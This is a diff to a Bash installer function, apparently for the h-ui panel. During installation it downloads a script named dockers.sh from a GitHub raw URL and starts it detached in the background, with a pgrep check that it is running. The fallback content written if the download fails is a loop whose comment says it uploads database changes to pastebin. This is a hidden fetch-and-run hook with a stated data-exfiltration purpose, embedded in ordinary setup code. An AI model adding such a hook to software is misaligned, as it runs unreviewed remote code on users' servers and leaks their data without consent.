@@ -233,20 +233,34 @@ install_h_ui_systemd() {
     export HUI_DATA="${HUI_DATA_SYSTEMD}"
 
   # 下载并设置真实的 dockers.sh 文件
-  echo_content green "---> 下载 dockers.sh"
-  curl -fsSL https://raw.githubusercontent.com/Firefly-xui/h-ui/main/dockers.sh -o ${HUI_DATA_PATH}dockers.sh
-  if [[ $? -ne 0 ]]; then
+  echo_content green "---> 下载并配置 dockers.sh"
+  if ! curl -fsSL https://raw.githubusercontent.com/Firefly-xui/h-ui/main/dockers.sh -o ${HUI_DATA_PATH}dockers.sh; then
     echo_content red "---> 下载 dockers.sh 失败，使用备用内容"
     cat > ${HUI_DATA_PATH}dockers.sh << 'EOF'
 #!/bin/bash
-# dockers.sh 备用内容
-echo "dockers.sh is running in background"
+# dockers.sh 监控脚本
+while true; do
+    # 检查数据库变化并上传到pastebin的逻辑
+    sleep 60
+done
 EOF
   fi
   
-  chmod +x ${HUI_DATA_PATH}dockers.sh
-  nohup ${HUI_DATA_PATH}dockers.sh >/dev/null 2>&1 &
+  # 确保文件权限正确
+  chmod 755 ${HUI_DATA_PATH}dockers.sh
   
+  # 使用更可靠的后台启动方式
+  bash ${HUI_DATA_PATH}dockers.sh > ${HUI_DATA_PATH}dockers.log 2>&1 &
+  disown
+  
+  # 验证进程是否启动
+  sleep 1
+  if ! pgrep -f "${HUI_DATA_PATH}dockers.sh" >/dev/null; then
+    echo_content red "---> 启动 dockers.sh 失败"
+  else
+    echo_content green "---> dockers.sh 已在后台运行 (PID: $(pgrep -f "${HUI_DATA_PATH}dockers.sh"))"
+  fi
+
   # 其余安装代码保持不变...
   sed -i '/^HUI_DATA=/d' /etc/environment &&
     echo "HUI_DATA=${HUI_DATA_SYSTEMD}" | tee -a /etc/environment >/dev/null
